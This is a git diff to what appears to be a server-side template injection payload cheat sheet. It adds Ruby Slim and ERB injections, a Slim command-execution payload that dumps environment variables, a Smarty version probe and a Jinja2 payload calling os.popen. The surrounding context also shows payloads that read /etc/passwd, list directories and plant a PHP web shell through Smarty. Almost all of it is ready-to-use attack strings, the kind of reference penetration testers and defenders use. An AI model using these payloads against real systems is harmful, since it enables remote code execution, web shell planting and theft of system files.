@@ -7,7 +7,7 @@
 * [Tools](#tools)
 * [Methodology](#methodology)
 * [Ruby](#ruby)
-  * [Basic injection](#basic-injection)
+  * [Basic injections](#basic-injections)
   * [Retrieve /etc/passwd](#retrieve--etc-passwd)
   * [List files and directories](#list-files-and-directories)
 * [Java](#java)
@@ -59,10 +59,18 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ## Ruby
 
-### Basic injection
+### Basic injections
+
+ERB:
 
 ```ruby
 <%= 7 * 7 %>
+```
+
+Slim:
+
+```ruby
+#{ 7 * 7 }
 ```
 
 ### Retrieve /etc/passwd
@@ -75,6 +83,14 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 ```ruby
 <%= Dir.entries('/') %>
+```
+
+### Code execution
+
+Execute code using SSTI for Slim engine.
+
+```powershell
+#{ %x|env| }
 ```
 
 ## Java
@@ -137,6 +153,7 @@ $output = $twig > render (
 ## Smarty
 
 ```python
+{$smarty.version}
 {php}echo `id`;{/php}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 ```
@@ -288,6 +305,7 @@ nv -lnvp 8000
 
 ```python
 {{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 ```
 
 #### Exploit the SSTI by calling Popen without guessing the offset
